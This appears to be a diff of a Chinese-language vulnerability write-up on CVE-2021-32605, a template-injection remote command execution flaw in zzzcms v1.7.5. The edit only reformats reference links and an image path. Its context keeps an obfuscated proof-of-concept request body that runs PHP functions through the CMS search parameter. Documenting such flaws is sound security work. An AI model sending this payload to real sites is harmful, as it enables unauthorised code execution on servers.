@@ -6,8 +6,8 @@ zzzcms v1.7.5 parserSearch 存在模板注入导致远程命令执行漏洞。
 
 参考链接：
 
-- https://nvd.nist.gov/vuln/detail/CVE-2021-32605
-- https://www.anquanke.com/post/id/212272
+* https://nvd.nist.gov/vuln/detail/CVE-2021-32605
+* https://www.anquanke.com/post/id/212272
 
 ## 漏洞影响
 
@@ -43,4 +43,4 @@ Host: your-ip
 keys={if:array_map(base_convert(27440799224,10,32),array(1))}{end if}
 ```
 
-![](images/zzzcms%20v1.7.5%20前台远程命令执行漏洞/image-20250407143723180.png)
+![](../.gitbook/assets/image-20250407143723180.png)
